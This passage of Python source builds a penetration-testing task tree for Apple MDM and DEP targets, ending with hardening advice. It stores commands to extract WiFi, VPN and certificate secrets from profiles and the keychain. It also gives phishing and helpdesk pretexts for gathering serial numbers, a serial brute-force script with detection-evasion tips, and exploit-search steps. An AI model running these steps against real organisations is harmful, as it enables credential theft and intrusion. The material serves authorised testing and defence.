                    'Insufficient privileges'
                ],
                'next_steps': [
                    'Extract WiFi passwords: grep -A 5 "com.apple.wifi" profiles.xml | grep Password',
                    'Extract VPN secrets: grep -A 10 "com.apple.vpn" profiles.xml',
                    'Extract certificates: grep PayloadContent profiles.xml',
                    'Test extracted credentials against other services',
                    'Document for penetration test report'
                ],
                'alternatives': [
                    'Manual: System Preferences > Profiles',
                    'security dump-keychain (for certificate passwords)',
                    'Parse: /Library/Managed Preferences/'
                ],
                'notes': 'Configuration profiles often contain high-value credentials: WiFi PSKs, VPN shared secrets, email passwords, certificate private keys. ALWAYS harvest during post-exploitation.'
            }
        })

        tasks['children'].append(persistence_tasks)

        # === PHASE 6: ORGANIZATIONAL RECONNAISSANCE ===

        org_recon_tasks = {
            'id': f'org-recon-{port}',
            'name': 'Organizational Intelligence via MDM',
            'type': 'parent',
            'children': []
        }

        # Task 14: Serial Number Enumeration
        org_recon_tasks['children'].append({
            'id': f'serial-enumeration-{port}',
            'name': 'Enumerate Organization Serial Numbers for DEP Reconnaissance',
            'type': 'manual',
            'metadata': {
                'description': 'Systematically enumerate serial numbers to identify DEP-enrolled devices and extract organizational intelligence',
                'tags': ['OSCP:MEDIUM', 'RECON', 'OSINT'],
                'notes': '''Serial Number Enumeration Strategy:

**Objective**: Discover valid serial numbers for target organization to query DEP

**OSINT Sources**:

1. **LinkedIn Photos**:
   - Search: site:linkedin.com "Company Name" macbook
   - Look for photos of devices with visible serials
   - Bottom of MacBooks, back of iMacs

2. **Social Media**:
   - Instagram/Twitter posts showing workspace
   - Unboxing videos
   - Office tour photos

3. **Public Documents**:
   - IT asset registers (if leaked)
   - Insurance claims
   - E-waste disposal records

4. **Physical Access** (if authorized for physical pentest):
   - Conference room devices
   - Reception area displays
   - Visitor laptop trays

5. **Social Engineering**:
   - Call IT helpdesk: "I need to report my serial number for MDM enrollment"
   - Phishing: "Please click here to register your device [captures serial]"

**Brute-Force Strategy** (Low probability, but possible):

```python
#!/usr/bin/env python3
import itertools
import requests

# Target organization known info
MANUFACTURING_LOCATION = "C0"  # China (common)
YEAR_CODE = "Y"  # 2019 H1 (example)
WEEK_CODE = "M"  # Mid-year week

# Model codes for MacBook Pro (example)
MODEL_CODES = ["F8J2", "QX9C", "DK3N"]

def generate_serials():
    # Generate unique identifier combinations (chars 6-8)
    # 3 alphanumeric characters = 36^3 = 46,656 combinations
    chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    for model in MODEL_CODES:
        for combo in itertools.product(chars, repeat=3):
            unique_id = ''.join(combo)
            serial = f"{MANUFACTURING_LOCATION}{YEAR_CODE}{WEEK_CODE}{unique_id}{model}"
            yield serial

def test_serial(serial):
    # Test against DEP (requires LLDB instrumentation or similar)
    # This is a simplified example
    print(f"Testing: {serial}")
    # ... DEP check-in logic ...

# WARNING: This generates 46,656+ combinations per model
# Apple may rate-limit or detect enumeration
for serial in generate_serials():
    test_serial(serial)
    # Add delays to avoid detection
```

**Proximity Enumeration**:
- If you have ONE valid serial, try adjacent numbers
- C02Y13ECF8J2 → C02Y13EDF8J2, C02Y13EEF8J2, etc.
- Devices purchased together often have sequential serials

**Validation**:
- Test serial against Apple Warranty Check: https://checkcoverage.apple.com/
- Valid serial = potentially DEP enrolled
- Query DEP profile (requires LLDB method)

**Ethical Considerations**:
- Only test with written authorization
- Enumeration without authorization may violate CFAA
- Document methodology in pentest report''',
                'success_indicators': [
                    'Valid serial numbers identified',
                    'DEP enrollment confirmed',
                    'Multiple organization devices discovered',
                    'Organizational purchasing patterns identified'
                ],
                'failure_indicators': [
                    'No valid serials found',
                    'Apple rate limiting detected',
                    'DEP profiles return empty'
                ],
                'next_steps': [
                    'Query DEP for each discovered serial',
                    'Analyze DEP profiles for MDM configuration',
                    'Map organization device inventory',
                    'Identify vulnerable MDM enrollments',
                    'Report findings to organization'
                ],
                'alternatives': [
                    'Request asset list from client (white-box testing)',
                    'Physical device observation during site visit',
                    'Employee interview (authorized scope)'
                ]
            }
        })

        # Task 15: MDM Vendor Identification
        org_recon_tasks['children'].append({
            'id': f'mdm-vendor-id-{port}',
            'name': 'Identify MDM Vendor and Version',
            'type': 'command',
            'metadata': {
                'command': f'curl -sSk https://{target}:{port}/ | grep -iE "jamf|workspace|intune|mobileiron|kandji|simplemdm|addigy" -A 2 -B 2',
                'description': 'Identify specific MDM vendor for targeted exploit research',
                'tags': ['OSCP:HIGH', 'RECON', 'QUICK_WIN'],
                'flag_explanations': {
                    'grep -iE': 'Case-insensitive extended regex',
                    '-A 2': 'Include 2 lines after match',
                    '-B 2': 'Include 2 lines before match'
                },
                'success_indicators': [
                    'MDM vendor identified (Jamf, VMware, Intune, etc.)',
                    'Version number discovered',
                    'Product-specific strings found'
                ],
                'failure_indicators': [
                    'Generic web server response',
                    'Custom/unidentified MDM solution',
                    'No vendor indicators'
                ],
                'next_steps': [
                    'Search CVE database for identified vendor/version',
                    'searchsploit [vendor] [version]',
                    'Research default credentials for vendor',
                    'Check vendor documentation for API endpoints',
                    'Test vendor-specific vulnerabilities'
                ],
                'alternatives': [
                    f'whatweb https://{target}:{port}',
                    f'nmap --script http-enum {target}',
                    'Manual: Analyze JavaScript/CSS file names for vendor references'
                ],
                'notes': '''Common MDM Vendors and Indicators:

**Jamf Pro**: /jamf/, /enroll.html, "Jamf" in HTML
**VMware Workspace ONE**: /workspace/, "VMware AirWatch"
**Microsoft Intune**: /EnrollmentServer/, "Microsoft Intune"
**MobileIron**: /mifs/, "MobileIron"
**Kandji**: /kandji/, "Kandji"
**SimpleMDM**: /simplemdm/
**Addigy**: /addigy/

Each vendor has unique vulnerabilities and default configurations.'''
            }
        })

        tasks['children'].append(org_recon_tasks)

        # === PHASE 7: EXPLOIT RESEARCH ===

        if version:
            tasks['children'].append({
                'id': f'mdm-exploit-research-{port}',
                'name': f'MDM Exploit Research: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-mdm-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "{version}" mdm',
                            'description': 'Search ExploitDB for MDM-related vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH', 'QUICK_WIN'],
                            'flag_explanations': {
                                'mdm': 'Include MDM keyword in search'
                            },
                            'success_indicators': [
                                'Exploits found for version',
                                'Relevant CVEs identified'
                            ],
                            'next_steps': [
                                'Review exploit details and requirements',
                                'Test exploits in lab environment first',
                                'Adapt exploits for target configuration'
                            ],
                            'alternatives': [
                                f'Manual: https://www.exploit-db.com/',
                                'Google: "{version}" MDM vulnerability',
                                'CVE database search'
                            ]
                        }
                    },
                    {
                        'id': f'github-exploit-search-{port}',
                        'name': f'GitHub Exploit Search: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'curl -sSk "https://api.github.com/search/repositories?q={version}+mdm+exploit" | grep -E "full_name|description" | head -20',
                            'description': 'Search GitHub for MDM exploit repositories and PoCs',
                            'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                            'success_indicators': [
                                'Exploit repositories found',
                                'PoC code available',
                                'Recent research identified'
                            ],
                            'alternatives': [
                                'Manual: https://github.com/search?q=mdm+exploit',
                                'Manual: https://github.com/search?q=jamf+vulnerability'
                            ]
                        }
                    }
                ]
            })

        # === REMEDIATION GUIDANCE ===

        tasks['children'].append({
            'id': f'mdm-remediation-{port}',
            'name': 'MDM Security Remediation Guidance',
            'type': 'manual',
            'metadata': {
                'description': 'Security hardening recommendations for MDM deployments',
                'tags': ['DOCUMENTATION'],
                'notes': '''MDM Security Best Practices:

**1. Enrollment Protection**:
- Require authentication before enrollment (API keys, OAuth)
- Implement device attestation (validate serial numbers against known inventory)
- Use invitation-based enrollment (pre-authorized devices only)
- Monitor for unauthorized enrollment attempts
- Alert on enrollment from unexpected locations

**2. Certificate Pinning**:
- Pin MDM server certificates in DEP profiles
- Use anchor-certs property to specify trusted CAs
- Prevent MITM attacks on MDM communication

**3. SCEP Security**:
- Use strong challenge passwords (not predictable/default)
- Rotate SCEP challenges regularly
- Implement rate limiting on SCEP endpoints
- Log all certificate issuance requests

**4. Network Segmentation**:
- Isolate MDM server on dedicated VLAN
- Restrict access to MDM ports (443, 2195, 2196, 5223)
- Use firewall rules to limit source IPs
- Implement IDS/IPS for MDM traffic

**5. Profile Protection**:
- Never include sensitive credentials in profiles when possible
- Encrypt sensitive configuration values
- Use certificate-based authentication instead of passwords
- Set PayloadRemovalDisallowed carefully (balance security vs. recovery)

**6. Monitoring & Logging**:
- Log all MDM commands issued
- Alert on suspicious commands (EraseDevice, RemoveProfile)
- Monitor for enrollment anomalies
- Audit profile installations regularly

**7. Vendor Security**:
- Keep MDM server software updated (patch management)
- Review vendor security advisories
- Disable unnecessary MDM features
- Use least-privilege administrative accounts

**8. Serial Number Protection**:
- Educate employees not to share serial numbers
- Remove serial stickers from public-facing devices
- Implement DEP "await configuration" timeout
- Monitor Apple DEP portal for unauthorized enrollments

**9. Physical Security**:
- Firmware password on devices (prevents Recovery Mode bypass)
- FileVault encryption (protects profile data at rest)
- Secure wipe decommissioned devices

**10. Incident Response**:
- Prepare MDM compromise playbook
- Ability to quickly revoke device certificates
- Mass unenroll capability for incidents
- Regular backups of MDM configuration'''
            }
        })

        return tasks
